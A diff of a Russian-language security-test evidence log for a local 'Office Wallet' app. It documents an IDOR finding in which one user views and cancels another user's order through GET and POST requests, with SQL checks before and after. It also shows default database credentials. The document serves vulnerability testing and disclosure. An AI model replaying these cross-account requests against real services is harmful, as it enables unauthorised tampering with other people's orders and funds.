@@ -12,32 +12,32 @@ OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
     · (доступ к БД у нас из docker-compose.yml, пароль wallet/wallet):
     → INSERT INTO orders (user_id, status, total_kop, ...) VALUES (2, 'paid', 45000, ...)
     → SQL INSERT INTO orders (user_id, status, total_kop, lines_json, item_comment) VALUES (2,'paid',45000,'[]','создан для проверки IDOR') RETURNING id
-    ← psql 204
+    ← psql 220
     INSERT 0 1
-    ← psql: заказ #204 создан
-    → SQL SELECT user_id FROM orders WHERE id=204
+    ← psql: заказ #220 создан
+    → SQL SELECT user_id FROM orders WHERE id=220
     ← psql 2
     → SQL SELECT balance_kop FROM users WHERE id=2
-    ← psql 887300
-    → SQL SELECT id||' '||status FROM orders WHERE id=204;
-    ← psql 204 paid
+    ← psql 922300
+    → SQL SELECT id||' '||status FROM orders WHERE id=220;
+    ← psql 220 paid
     ┌─ АРТЕФАКТ · OW-04 · чужой заказ до атаки
-    │ заказ #204, владелец user_id=2, статус=204 paid
-    │ баланс владельца до: 887300 коп
+    │ заказ #220, владелец user_id=2, статус=220 paid
+    │ баланс владельца до: 922300 коп
     └─
-    → GET /orders/204  (просмотр чужого заказа — проверки владельца нет)
+    → GET /orders/220  (просмотр чужого заказа — проверки владельца нет)
     ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
-    увидели: Заказ #204
-    → POST /orders/204/cancel  (отмена чужого заказа)
-    ← HTTP 302 redirect=http://localhost:18081/orders/204  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    увидели: Заказ #220
+    → POST /orders/220/cancel  (отмена чужого заказа)
+    ← HTTP 302 redirect=http://localhost:18081/orders/220  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
     → SQL SELECT balance_kop FROM users WHERE id=2
-    ← psql 932300
-    → SQL SELECT id||' '||status FROM orders WHERE id=204;
-    ← psql 204 cancelled
-    → SQL SELECT id||' '||status FROM orders WHERE id=204;
-    ← psql 204 cancelled
+    ← psql 967300
+    → SQL SELECT id||' '||status FROM orders WHERE id=220;
+    ← psql 220 cancelled
+    → SQL SELECT id||' '||status FROM orders WHERE id=220;
+    ← psql 220 cancelled
     ┌─ АРТЕФАКТ · OW-04 · чужой заказ после атаки
-    │ POST /orders/204/cancel принят; статус: 204 paid → 204 cancelled
-    │ баланс владельца: 887300 → 932300 коп
+    │ POST /orders/220/cancel принят; статус: 220 paid → 220 cancelled
+    │ баланс владельца: 922300 → 967300 коп
     └─
-[+] баланс жертвы 887300 -> 932300 коп: деньги вернулись ей, а отменил заказ ivanov
+[+] баланс жертвы 922300 -> 967300 коп: деньги вернулись ей, а отменил заказ ivanov
